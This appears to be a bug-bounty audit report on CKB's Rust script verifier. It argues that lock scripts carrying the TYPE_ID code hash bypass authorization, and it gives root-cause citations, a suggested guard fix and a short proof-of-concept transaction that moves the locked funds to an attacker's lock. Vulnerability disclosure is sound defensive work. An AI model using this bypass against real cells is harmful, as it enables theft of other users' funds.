Audit Report

## Title
TYPE_ID System Script Dispatched for Lock Groups Without Group-Type Check, Allowing Unconditional Lock Bypass — (File: `script/src/verify.rs`)

## Summary

`verify_script_group` dispatches to `TypeIdSystemScript::verify` based solely on `code_hash == TYPE_ID_CODE_HASH` and `hash_type == Type`, with no check that the script group is a type group. A cell whose **lock script** carries those two fields is routed to `TypeIdSystemScript`, which structurally cannot perform any meaningful authorization check for a lock group: the only cryptographic validation is gated on `input_indices.is_empty()`, which is always `false` for a spending lock group, so the function returns `Ok(TYPE_ID_CYCLES)` unconditionally, bypassing the lock entirely.

## Finding Description

**Root cause 1 — `verify_script_group` ignores `group.group_type`:** [1](#0-0) 

The dispatch condition checks only `code_hash` and `hash_type`. There is no `group.group_type == ScriptGroupType::Type` guard. A lock group whose script carries `TYPE_ID_CODE_HASH` + `hash_type::Type` is routed to `TypeIdSystemScript` instead of the normal VM runner. The same missing guard exists in `verify_group_with_chunk`. [2](#0-1) 

**Root cause 2 — Lock groups structurally never receive `output_indices`:** [3](#0-2) 

Lock groups only accumulate `input_indices`. Output iteration at lines 733–740 only pushes to `type_groups`, never to `lock_groups`. [4](#0-3) 

**Root cause 3 — `TypeIdSystemScript::verify` only validates when `input_indices.is_empty()`:** [5](#0-4) 

For a lock group spending one cell: `input_indices = [i]`, `output_indices = []`. The check `1 > 1 || 0 > 1` is `false`, so no error. The creation-hash check is gated on `input_indices.is_empty()` (line 52), which is `false`, so it is skipped entirely. [6](#0-5) 

The function falls through to `Ok(TYPE_ID_CYCLES)` with no authorization performed. [7](#0-6) 

## Impact Explanation

Any cell whose lock script is `Script { code_hash: TYPE_ID_CODE_HASH, hash_type: Type, args: <exactly 32 bytes> }` can be spent by any party in any transaction with no signature, witness, or proof. This constitutes **incorrect implementation or behavior of a CKB system script** (High, 10001–15000 points). If such cells hold CKB or UDT assets, those assets are freely claimable by any network participant, which also maps to **damage to CKB economy** (Critical, 15001–25000 points) depending on the value at risk.

## Likelihood Explanation

`TYPE_ID_CODE_HASH` is a well-known public constant. A developer who mistakenly uses TYPE_ID as a lock script (rather than a type script), or any contract that references it for uniqueness properties in the lock position, silently exposes all locked value. The exploit requires no special privileges: an attacker submits a standard transaction via P2P or RPC spending the target cell, with any output lock they control. The attack is repeatable and requires no victim interaction beyond the initial cell creation.

## Recommendation

Add a `group.group_type == ScriptGroupType::Type` guard in `verify_script_group` and `verify_group_with_chunk` before dispatching to `TypeIdSystemScript`:

```rust
if group.group_type == ScriptGroupType::Type
    && group.script.code_hash() == TYPE_ID_CODE_HASH.into()
    && Into::<u8>::into(group.script.hash_type()) == Into::<u8>::into(ScriptHashType::Type)
{
    // TYPE_ID path
} else {
    self.run(group, max_cycles)
}
```

This ensures TYPE_ID verification semantics are only applied to type script groups. Any lock script that happens to carry `TYPE_ID_CODE_HASH` will be executed through the normal VM, which will fail to find a matching binary (or execute whatever binary is referenced), rather than silently succeeding.

## Proof of Concept

```rust
// Cell with TYPE_ID as lock (not type), args exactly 32 bytes
let type_id_lock = Script::new_builder()
    .args(Bytes::from([0u8; 32].as_ref()))
    .code_hash(TYPE_ID_CODE_HASH)
    .hash_type(ScriptHashType::Type.into())
    .build();

let input_cell = CellOutputBuilder::default()
    .capacity(capacity_bytes!(1000))
    .lock(type_id_lock.clone())
    .build();

let transaction = TransactionBuilder::default()
    .input(CellInput::new(OutPoint::new(h256!("0xdead").into(), 0), 0))
    .output(CellOutputBuilder::default()
        .capacity(capacity_bytes!(1000))
        .lock(attacker_lock_script)
        .build())
    .build();

// verify_script_group dispatches to TypeIdSystemScript for the lock group:
//   input_indices = [0], output_indices = []
//   args.len() == 32                  → passes L36 check
//   1 > 1 || 0 > 1                   → false, passes L42 check
//   input_indices.is_empty() == false → hash check at L52 skipped
//   returns Ok(TYPE_ID_CYCLES)
let result = verifier.verify(script_version, &rtx, TYPE_ID_CYCLES * 2);
assert!(result.is_ok()); // lock bypassed, funds transferred to attacker
```

### Citations

**File:** script/src/verify.rs (L432-434)
```rust
        if group.script.code_hash() == TYPE_ID_CODE_HASH.into()
            && Into::<u8>::into(group.script.hash_type()) == Into::<u8>::into(ScriptHashType::Type)
        {
```

**File:** script/src/verify.rs (L452-454)
```rust
        if group.script.code_hash() == TYPE_ID_CODE_HASH.into()
            && Into::<u8>::into(group.script.hash_type()) == Into::<u8>::into(ScriptHashType::Type)
        {
```

**File:** script/src/types.rs (L722-725)
```rust
            let lock_group_entry = lock_groups
                .entry(output.calc_lock_hash())
                .or_insert_with(|| ScriptGroup::from_lock_script(&output.lock()));
            lock_group_entry.input_indices.push(i);
```

**File:** script/src/types.rs (L733-740)
```rust
        for (i, output) in rtx.transaction.outputs().into_iter().enumerate() {
            if let Some(t) = &output.type_().to_opt() {
                let type_group_entry = type_groups
                    .entry(t.calc_script_hash())
                    .or_insert_with(|| ScriptGroup::from_type_script(t));
                type_group_entry.output_indices.push(i);
            }
        }
```

**File:** script/src/type_id.rs (L42-44)
```rust
        if self.script_group.input_indices.len() > 1 || self.script_group.output_indices.len() > 1 {
            return Err(self.validation_failure(ERROR_TOO_MANY_CELLS));
        }
```

**File:** script/src/type_id.rs (L52-75)
```rust
        if self.script_group.input_indices.is_empty() {
            let first_cell_input = self
                .rtx
                .transaction
                .inputs()
                .get(0)
                .ok_or_else(|| self.validation_failure(ERROR_ARGS))?;
            let first_output_index: u64 = self
                .script_group
                .output_indices
                .first()
                .map(|output_index| *output_index as u64)
                .ok_or_else(|| self.validation_failure(ERROR_ARGS))?;

            let mut blake2b = new_blake2b();
            blake2b.update(first_cell_input.as_slice());
            blake2b.update(&first_output_index.to_le_bytes());
            let mut ret = [0; 32];
            blake2b.finalize(&mut ret);

            if ret[..] != self.script_group.script.args().raw_data()[..] {
                return Err(self.validation_failure(ERROR_INVALID_INPUT_HASH));
            }
        }
```

**File:** script/src/type_id.rs (L76-76)
```rust
        Ok(TYPE_ID_CYCLES)
```
